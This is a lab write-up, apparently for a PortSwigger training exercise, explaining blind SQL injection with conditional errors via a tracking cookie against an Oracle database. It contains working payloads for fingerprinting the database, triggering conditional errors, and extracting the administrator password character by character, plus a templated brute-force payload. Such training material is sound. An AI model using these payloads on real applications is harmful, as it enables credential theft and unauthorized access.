# 📝 Lab: Blind SQL Injection with Conditional Errors

* **Vulnerability:** SQL Injection
* **Difficulty:** PRACTITIONER
* **Objective:** Log in as the `administrator` user.

> **Description:**
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
>
> The database contains a different table called `users`, with columns called `username` and `password`. The goal is to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user and then log in as that user.

---

## 🛠️ Tools Used

* Browser + FoxyProxy
* Burp Suite
* Python

---

## 🐾 Steps to Reproduce

### 1. Intercept the request

Open the lab homepage and intercept the request using **Burp Suite**.

Once the request is captured, go to:

**Proxy → HTTP History**

Find the request made to the lab and right-click it, then select:

**Send to Repeater** (`Ctrl + R`)

We'll use **Repeater** to test our SQL injection payloads.

---

### 2. Find the vulnerable parameter

In the request, look for the `TrackingId` cookie.

This is the parameter we're going to target because its value is used inside a SQL query by the application.

For example:

```http
Cookie: TrackingId=YOUR-COOKIE
```

---

### 3. Identify the database type

First, let's figure out which database engine the application is using.

Try the following payload:

```sql
'||(SELECT '')||'
```

If the response is:

```http
200 OK
```

then this syntax is not causing an error, so the database is probably **not Oracle**.

Now try the Oracle-specific version:

```sql
'||(SELECT '' FROM dual)||'
```

If this returns:

```http
200 OK
```

while the previous payload caused an error, we can identify the database as **Oracle**.

The reason for this is that Oracle requires a table reference for a `SELECT` statement in this context, and `DUAL` is Oracle's built-in dummy table.

---

### 4. Confirm that conditional errors can be triggered

Now that we've identified Oracle, we can test whether we can intentionally trigger an error based on a condition.

Use:

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

Because:

```sql
1=1
```

is always true, the `CASE` statement executes:

```sql
TO_CHAR(1/0)
```

which causes a division-by-zero error.

If the application returns its custom error response, we've confirmed that we can use **conditional errors as our blind SQL injection technique**.

We can also test the opposite condition:

```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

This time:

```sql
1=2
```

is false, so the `ELSE` branch is executed and no division-by-zero error occurs.

This gives us a simple way to distinguish between:

* **Condition is TRUE → SQL error**
* **Condition is FALSE → No SQL error**

That's the key idea behind this lab.

---

### 5. Test the administrator's password

The lab already tells us that the database contains:

```text
users
```

with:

```text
username
password
```

So we can directly test the administrator's password one character at a time.

For example, to check whether the **first character** of the administrator's password is `a`, use:

```sql
'||(SELECT CASE WHEN SUBSTR(password, 1, 1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Here's what's happening:

```sql
SUBSTR(password, 1, 1)
```

means:

> Take 1 character from `password`, starting at position 1.

Then:

```sql
='a'
```

checks whether that character is `a`.

If the character is correct, this part executes:

```sql
TO_CHAR(1/0)
```

and the application returns an error.

So we can use the server's error response as a **true/false signal**.

---

### 6. Brute-force the password character by character

Obviously, manually testing every possible character would take a while.

Instead, we can automate it using **Burp Intruder** or a small Python script.

The basic idea is:

```text
Position 1 → try a, b, c, d, ...
Position 2 → try a, b, c, d, ...
Position 3 → try a, b, c, d, ...
...
```

For every position, we send a payload that checks one possible character.

If the response indicates an error, we've found the correct character.

We then move to the next position.

---

### 7. Use the Python tool

For this lab, we'll use our own [Python tool](https://github.com/noata5505/Portswigger-Lab-Burp-Community/blob/main/SQL-Injection/Tools/12_Bruteforce_Tool.py) instead of manually configuring Burp Intruder.

Run the tool and enter the lab URL:

```text
https://(YOUR-ID).web-security-academy.net/
```

Then provide the cookie payload using:

```text
(YOUR-COOKIE)'||(SELECT CASE WHEN SUBSTR(password, {i}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The `{i}` placeholder represents the password position, while `{char}` represents the character we're currently testing.

The script can then iterate through the possible characters and positions automatically.

---

### 8. Get the administrator password

After the brute-force process finishes, the tool should have reconstructed the administrator's password character by character.

For example, the process looks roughly like:

```text
Position 1 → ?
Position 2 → ?
Position 3 → ?
Position 4 → ?
...
```

The exact password will depend on the lab instance, so use the value returned by your own lab.

---

### 9. Log in as administrator

Go back to the lab's login page and enter:

```text
Username: administrator
Password: [password discovered by the script]
```

Log in using the credentials you recovered.

If everything worked correctly, the lab should be marked as solved and the **LAB SOLVED** banner will appear.

🎉 **BOOM!**

<img width="1917" height="911" alt="Screenshot 2026-09-24 224552" src="https://github.com/user-attachments/assets/a1ba2186-db69-4386-8b73-d19a99091d2e" />


---

## 💣 Payload

### 1. Oracle database detection

```sql
'||(SELECT '')||'
```

This is the first payload used to check whether a basic subquery works.

For Oracle, we can then use:

```sql
'||(SELECT '' FROM dual)||'
```

`DUAL` is an Oracle-specific dummy table, so this helps identify that the backend is using Oracle.

---

### 2. Triggering a conditional SQL error

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

The important part is:

```sql
CASE WHEN (1=1)
```

Since the condition is true, Oracle evaluates:

```sql
TO_CHAR(1/0)
```

which causes a division-by-zero error.

To test a false condition:

```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

Since `1=2` is false, the `ELSE` branch is used and no intentional error is triggered.

This gives us the true/false behavior needed for the blind SQL injection.

---

### 3. Checking a password character

```sql
'||(SELECT CASE WHEN SUBSTR(password, 1, 1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The important part is:

```sql
SUBSTR(password, 1, 1)='a'
```

It checks whether the first character of the administrator's password is `a`.

The structure can be generalized to:

```sql
SUBSTR(password, {position}, 1)='{character}'
```

For example:

```sql
SUBSTR(password, 2, 1)='b'
```

checks whether the second character is `b`.

---

### 4. Automated brute-force payload

The payload used by the Python tool is:

```text
(YOUR-COOKIE)'||(SELECT CASE WHEN SUBSTR(password, {i}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The script changes:

* `{i}` → password position
* `{char}` → character being tested

The response is then checked to determine whether the condition was true or false.

In short:

```text
Correct character
      ↓
Condition = TRUE
      ↓
1 / 0
      ↓
SQL error
      ↓
Character confirmed
```

---

## 🎯 Impact

This vulnerability allows an attacker to extract sensitive information from the database even though the application does not directly return the result of the SQL query.

In this lab, the attacker can:

* Inject arbitrary SQL logic into the `TrackingId` cookie.
* Determine whether a SQL condition is true or false based on whether an error occurs.
* Extract the `administrator` password character by character.
* Recover valid administrator credentials.
* Log in to the application as the `administrator` user.

The main issue is that **database errors are exposed as an observable response difference**. Even though the application doesn't directly display the query result, the error behavior effectively becomes a side channel for extracting data.

In a real application, this could potentially expose other sensitive database information depending on the privileges of the database user and the queries that can be injected.

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**
